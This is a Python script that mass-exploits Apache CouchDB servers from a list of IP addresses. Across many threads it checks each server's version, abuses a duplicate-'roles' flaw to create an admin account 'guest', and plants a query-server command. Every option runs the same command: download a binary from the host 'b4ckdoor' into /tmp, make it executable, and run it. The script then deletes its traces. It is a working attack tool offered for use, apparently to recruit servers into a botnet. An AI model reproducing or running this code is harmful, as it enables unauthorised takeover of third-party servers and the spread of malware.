#!/usr/bin/env python
from requests.auth import HTTPBasicAuth
import random
import requests
import re
import sys
from threading import Thread
from time import sleep
	

ips = open(sys.argv[1], "r").readlines()
Rdatabases = ["/a564r6fusmg","/dyejdffyjdxryj","/esreghsrgfbgrsb","/sfafdbsrdgjqef","/fyukddyuodyj","/yfjdued6yjdsza","/wefrhnwgerhgsrh","/sfdrebwbef","/fdfgffrgfdsg"]

def getVersion(ip):
	version = requests.get(ip).json()["version"]
	return version
 
def exploit(ip):
	global Rdatabases
	try:
		try:
			if sys.argv[2] == "-r":
				cmd = "cd /tmp; wget http://b4ckdoor/x86; curl wget http://b4ckdoor/x86 -O; chmod 777 x86; ./x86 root;"
			elif sys.argv[2] == "-c":
                		cmd = "cd /tmp; wget http://b4ckdoor/x86; curl wget http://b4ckdoor/x86 -O; chmod 777 x86; ./x86 root;"
                	elif sys.argv[2] == "-w":
				cmd = "cd /tmp; wget http://b4ckdoor/x86; curl wget http://b4ckdoor/x86 -O; chmod 777 x86; ./x86 root;"
			elif sys.argv[2] == "-x":
                		cmd = "cd /tmp; wget http://b4ckdoor/x86; curl wget http://b4ckdoor/x86 -O; chmod 777 x86; ./x86 root; "
			elif not sys.argv[2]:
				print "NOT ENOUGH ARGUMENTS!"
				sys.exit(0)
		except SyntaxError as e:
			print "\n   Options: (-r|-c|-w|-x)"
		db_ = random.choice(Rdatabases)
		db = db_
		ip = ip.rstrip("\n")
		ip = "http://"+ip+":5984"
		version = getVersion(ip)
		#print("[*] Detected CouchDB Version " + version)
		vv = version.replace(".", "")
		v = int(version[0])
		if v == 1 and int(vv) <= 170:
			version = 1
		elif v == 2 and int(vv) < 211:
			version = 2
		else:
			#print("[-] Version " + version + " not vulnerable.")
			sys.exit()
		with requests.session() as session:
			#print("[*] Attempting %s Version %d"%(ip,v))
			session.headers = {"Content-Type": "application/json"}
	 
			try:
				payload = '{"type": "user", "name": "'
				payload += "guest"
				payload += '", "roles": ["_admin"], "roles": [],'
				payload += '"password": "guest"}'

				pr = session.put(ip + "/_users/org.couchdb.user:guest",
					data=payload)

				#print("[+] User guest with password guest successfully created.")
			except requests.exceptions.HTTPError:
				sys.exit()
			session.auth = HTTPBasicAuth("guest", "guest")
			try:
				if version == 1:
					session.put(ip + "/_config/query_servers/cmd",
							data='"' + cmd + '"')
					#print("[+] Created payload at: " + ip + "/_config/query_servers/cmd")
				else:
					host = session.get(ip + "/_membership").json()["all_nodes"][0]
					session.put(ip + "/_node/" + ip + "/_config/query_servers/cmd",
							data='"' + cmd + '"')
					#print("[+] Created payload at: " + ip + "/_node/" + host + "/_config/query_servers/cmd")
			except requests.exceptions.HTTPError as e:
				sys.exit()
	 
			try:
				session.put(ip + db)
				session.put(ip + db + "/zero", data='{"_id": "HTP"}')
			except requests.exceptions.HTTPError:
				sys.exit()
	 
			# Execute payload
			try:
				if version == 1:
					session.post(ip + db + "/_temp_view?limit=10",
							data='{"language": "cmd", "map": ""}')
				else:
					session.post(ip + db + "/_design/zero",
							data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd"}')
				print("[+] Command executed: " + cmd)
			except requests.exceptions.HTTPError:
				sys.exit()

			#print("[*] Cleaning up.")

			# Cleanup database
			try:
				session.delete(ip + db)
			except requests.exceptions.HTTPError:
				sys.exit()
	 
			# Cleanup payload
			try:
				if version == 1:
					session.delete(ip + "/_config/query_servers/cmd")
				else:
					host = session.get(ip + "/_membership").json()["all_nodes"][0]
					session.delete(ip + "/_node" + host + "/_config/query_servers/cmd")
			except requests.exceptions.HTTPError:
				sys.exit()
	except:
		pass
for ip in ips:
	try:
		hoho = Thread(target=exploit, args=(ip,))
		hoho.start()
		sleep(0.001)
	except:
		pass
